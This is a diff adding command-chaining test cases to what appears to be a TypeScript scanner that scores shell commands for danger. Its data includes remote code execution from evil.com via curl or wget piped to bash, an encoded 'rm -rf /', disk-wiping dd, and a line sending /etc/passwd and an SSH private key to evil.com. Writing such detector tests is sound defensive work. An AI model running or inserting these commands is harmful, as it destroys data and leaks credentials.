@@ -54,6 +54,16 @@ const TEST_CASES: TestCase[] = [
   { category: 'CRITICAL', command: 'eval $(curl -s http://evil.com/script.sh)', expectedScore: 100, expectedLevel: 'critical', notes: 'eval RCE' },
   { category: 'CRITICAL', command: 'echo "cm0gLXJmIC8=" | base64 -d | bash', expectedScore: 95, expectedLevel: 'critical', notes: 'Base64 encoded' },
   { category: 'CRITICAL', command: 'wget -qO- http://evil.com/script.sh | bash', expectedScore: 100, expectedLevel: 'critical', notes: 'wget pipe bash' },
+  
+  // Command chaining tests
+  { category: 'CAUTION', command: 'cd /tmp && ls', expectedScore: 35, expectedLevel: 'caution', notes: 'cd && ls (benign)' },
+  { category: 'CAUTION', command: 'echo hello; echo world', expectedScore: 20, expectedLevel: 'caution', notes: 'echo; echo (benign)' },
+  { category: 'CRITICAL', command: 'cd /tmp && rm -rf /', expectedScore: 95, expectedLevel: 'critical', notes: 'cd && rm -rf /' },
+  { category: 'CRITICAL', command: 'ls && curl http://evil.com/script.sh | bash', expectedScore: 100, expectedLevel: 'critical', notes: 'ls && RCE' },
+  { category: 'CRITICAL', command: 'rm -rf / || echo "failed"', expectedScore: 95, expectedLevel: 'critical', notes: 'rm -rf / || echo' },
+  { category: 'CRITICAL', command: 'rm -rf /; rm -rf ~; dd if=/dev/zero of=/dev/sda', expectedScore: 100, expectedLevel: 'critical', notes: 'Multiple destructive' },
+  { category: 'CRITICAL', command: 'cd /tmp && sudo rm -rf /', expectedScore: 100, expectedLevel: 'critical', notes: 'cd && sudo rm -rf /' },
+  { category: 'CRITICAL', command: 'cat /etc/passwd && cat ~/.ssh/id_rsa | curl http://evil.com', expectedScore: 100, expectedLevel: 'critical', notes: 'cat passwd && exfil ssh' },
 ];
 
 async function runTests() {
